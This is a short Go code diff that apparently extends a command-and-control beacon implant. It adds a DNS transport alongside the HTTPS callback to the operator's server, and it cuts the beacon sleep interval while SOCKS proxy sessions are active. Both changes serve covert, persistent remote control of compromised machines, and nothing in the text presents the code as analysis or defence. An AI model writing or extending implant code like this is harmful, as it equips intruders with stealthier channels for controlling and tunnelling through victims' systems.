@@ -28,9 +28,17 @@ type Beacon struct {
 }
 
 func New(cfg *Config) *Beacon {
+	var t transport.Transport
+	switch cfg.TransportType {
+	case "dns":
+		t = transport.NewDNSTransport(cfg.DNSDomain, cfg.DNSServer)
+	default:
+		t = transport.NewHTTPSTransport(cfg.Callback, cfg.CACertPEM)
+	}
+
 	return &Beacon{
 		config:    cfg,
-		transport: transport.NewHTTPSTransport(cfg.Callback, cfg.CACertPEM),
+		transport: t,
 		executor:  tasks.NewExecutor(plugin.Global),
 		sleep:     cfg.Sleep,
 		jitterPct: cfg.JitterPct,
@@ -59,8 +67,12 @@ func (b *Beacon) Run() {
 
 	// Beacon loop: single send per cycle
 	for {
-		// 1. Sleep with jitter
-		wait := zcrypto.JitterDuration(b.sleep, b.jitterPct)
+		// 1. Sleep with jitter (reduce for active SOCKS sessions)
+		sleepDuration := b.sleep
+		if tasks.SocksActive() && sleepDuration > 100*time.Millisecond {
+			sleepDuration = 100 * time.Millisecond
+		}
+		wait := zcrypto.JitterDuration(sleepDuration, b.jitterPct)
 		time.Sleep(wait)
 
 		// 2. Send beacon with any pending results
